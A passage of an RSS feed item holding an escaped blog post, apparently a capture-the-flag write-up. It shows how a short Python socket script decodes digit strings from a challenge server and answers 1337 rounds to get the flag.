+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Notice that we use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s.recv(1024)&lt;/code&gt; twice to receive data. This is because the server sends us two messages instead of just one, and the numbers are always shown in the second message. I should mention that when we get the answer right, we receive two responses again: one is a confirmation that we were correct, and the other contains the next number.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/numbers_challenge/4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The problem is that the server never sends us the numbers in a readable form; instead, it sends strings representing the numbers. So, we need to think about how to read the received values and interpret them accordingly.&lt;/p&gt;
+
+&lt;h2 id=&quot;an-elegant-solution&quot;&gt;An Elegant Solution&lt;/h2&gt;
+
+&lt;p&gt;To handle this challenge, the best approach is to understand that each number is represented by a string. This means we can create a dictionary to map each string to its corresponding number. Before creating the dictionary, we need to separate the responses appropriately so that we can build it.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pprint&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pprint&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pp&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;numb3rs.hopto.org&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8012&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;pp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)])&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pprint&lt;/code&gt; comes from Pretty Print and is useful when you need to print messages in a readable format. We use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strip&lt;/code&gt;. We also replaced the variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data1&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_&lt;/code&gt; since we won’t need that information in the code. And we have the following response:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/numbers_challenge/5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The first two lines and the last line are not actually relevant, but that’s not a problem. Nevertheless, we still need to handle the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\n&lt;/code&gt; characters in the code, and we can do that using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)])&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/numbers_challenge/6.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we have the numeric strings in the cleanest form possible, which is good. We can finally create the dictionary. To get each string, we just need to run the code a few times to capture all 10 possible digits, and then we have our dictionary. Due to some random unforeseen issues, unfortunately, I can’t directly provide the code here, but the dictionary should look like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/numbers_challenge/bonus.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;With this dictionary, we can convert the strings into their respective numbers, and then we will have the answer.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;answer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;numbers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;answer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;When running the code, we get the following result:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/numbers_challenge/7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This error occurs for the following reason: if the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get&lt;/code&gt; function isn’t used in the dictionary, strings that don’t exist in the dictionary would cause an error. That’s why we use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get&lt;/code&gt;, so we can define a default value if the string isn’t found. However, when trying to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;join&lt;/code&gt; on the list of numbers, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;None&lt;/code&gt; value caused this error, and to fix this, we need to remove that value. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter&lt;/code&gt; function is ideal for this situation because it can remove all unwanted values from the list and leave only those that matter. As mentioned before, the irrelevant strings are not a problem.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;answer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With this small error corrected, we can run the code again and get the expected answer.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/numbers_challenge/8.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;the-outcome&quot;&gt;The Outcome&lt;/h2&gt;
+
+&lt;p&gt;Now, all that remains is to create a loop that repeats this action 1337 times and also sends the information back to the server. This is the simplest part.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;numb3rs.hopto.org&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8012&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;numbers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;c1&quot;&gt;# Previously obtained dictionary
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;answer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
+        	&lt;span class=&quot;n&quot;&gt;numbers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;answer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;answer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;answer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;answer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We removed the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pprint&lt;/code&gt; function from the code since we no longer need it. We created a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;for&lt;/code&gt; loop to repeat the actions of receiving, translating, and sending information 1337 times. We used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s.send(bytes(answer, &apos;utf-8&apos;))&lt;/code&gt; to send the response in byte format so the server can understand it. Now, all we need to do is execute the code one last time, and voilà, we have our flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/numbers_challenge/9.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The final flag is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FIAP{th353_nuMb3r5_4r3_s0_b0r1n6!}&lt;/code&gt;. It was a lot of fun figuring out how to solve this challenge. It also helps us understand how to manipulate strings, work with sockets, and use dictionaries effectively. So that’s it, I hope I’ve taught you something new, and &lt;em&gt;Hack On!&lt;/em&gt;&lt;/p&gt;
+</description>
+        <pubDate>Wed, 09 Mar 2022 00:00:00 -0300</pubDate>
       </item>
     
   </channel>
